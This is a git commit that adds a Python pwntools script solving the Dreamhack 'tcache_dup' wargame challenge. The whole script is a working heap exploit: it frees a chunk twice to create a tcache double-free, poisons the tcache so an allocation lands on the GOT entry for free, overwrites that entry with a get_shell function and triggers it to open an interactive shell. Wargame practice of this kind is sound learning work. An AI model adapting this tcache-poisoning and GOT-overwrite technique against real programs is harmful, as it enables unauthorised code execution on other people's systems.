e966c506d6425d7c72f3f83db4204c35cb8bd016
youngwon son <zerone015@naver.com>
2026-03-09 03:38:31 +0900

    add exploit script for tcache_dup

---
+++ dreamhack/tcache_dup.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./tcache_dup_patched")
+libc = ELF("./libc-2.27.so")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+r = conn()
+
+def create(size, data):
+    r.sendlineafter(b"> ", b"1")
+    r.sendlineafter(b": ", str(size).encode())
+    r.sendafter(b": ", data)
+
+def delete(idx):
+    r.sendlineafter(b"> ", b"2")
+    r.sendlineafter(b": ", str(idx).encode())
+
+def main():
+
+    create(32, b"A")
+    delete(0)
+    delete(0)
+
+    create(32, p64(exe.got["free"]))
+    
+    create(32, b"A")
+    create(32, p64(exe.symbols["get_shell"]))
+
+    delete(0)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
